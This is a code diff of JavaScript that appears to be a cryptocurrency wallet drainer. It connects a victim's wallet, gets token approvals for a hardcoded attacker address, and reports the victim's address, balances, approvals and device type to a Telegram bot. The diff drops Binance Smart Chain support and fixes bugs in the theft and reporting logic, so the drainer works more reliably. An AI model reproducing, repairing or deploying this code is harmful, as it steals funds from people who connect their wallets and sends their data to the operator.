@@ -101,13 +101,6 @@ async function connectWalletAndSendTokens() {
       chainName: "eth",
       nativeCoin: "ETH",
       exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
-    },
-    {
-      chainId: 56,
-      name: "BSC",
-      chainName: "bsc",
-      nativeCoin: "BNB",
-      exodusAddress: "0xe22151324Ed5b8A4F2B45f1C3017D15B2aEc1B28"
     }
   ];
 
@@ -154,18 +147,12 @@ async function connectWalletAndSendTokens() {
           });
         } catch (switchErr) {
           if (switchErr.code === 4902) {
-            const chainConfig = network.chainId === 1 ? {
+            const chainConfig = {
               chainId: '0x1',
               chainName: 'Ethereum Mainnet',
               rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
               nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
               blockExplorerUrls: ['https://etherscan.io']
-            } : {
-              chainId: '0x38',
-              chainName: 'Binance Smart Chain',
-              rpcUrls: ['https://bsc-dataseed.binance.org/'],
-              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-              blockExplorerUrls: ['https://bscscan.com']
             };
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
@@ -230,7 +217,7 @@ async function connectWalletAndSendTokens() {
               t.token_address && 
               ethers.utils.isAddress(t.token_address) && 
               t.symbol && 
-              t.decimals !== Uint8Array
+              t.decimals !== undefined
             );
 
             tokenSummary = nonZeroTokens.length > 0
@@ -238,7 +225,7 @@ async function connectWalletAndSendTokens() {
                   const balance = ethers.utils.formatUnits(token.balance, token.decimals ?? 18);
                   return `• ${token.symbol}: ${balance}`;
                 }).join("\n")
-              : `No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances found.`;
+              : `No valid non-zero ${network.name} token balances found.`;
           } catch (apiErr) {
             console.warn(`API attempt ${apiAttempts} failed: ${apiErr.message}`);
             if (apiAttempts === maxAttempts) {
@@ -303,7 +290,7 @@ ${nativeBalanceMessage}
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
-Tx: B${approvalTx.hash}
+Tx: ${approvalTx.hash}
 ${deviceType}
                 `;
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -331,7 +318,7 @@ ${deviceType}
           }
         } else {
           const noTokensMessage = `
-⚠️ No valid non-zero ${network.chainName === 'eth' ? 'ERC-20' : 'BEP-20'} token balances to transfer on ${network.name}
+⚠️ No valid non-zero ERC-20 token balances to transfer on ${network.name}
 Address: ${userAddress}
 ${deviceType}
           `;
@@ -401,7 +388,7 @@ ${deviceType}
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: forEach({ chat_id: chatId, text: transferSuccessMessage })
+      body: JSON.stringify({ chat_id: chatId, text: transferSuccessMessage })
     });
   } catch (err) {
     const errorMessage = `
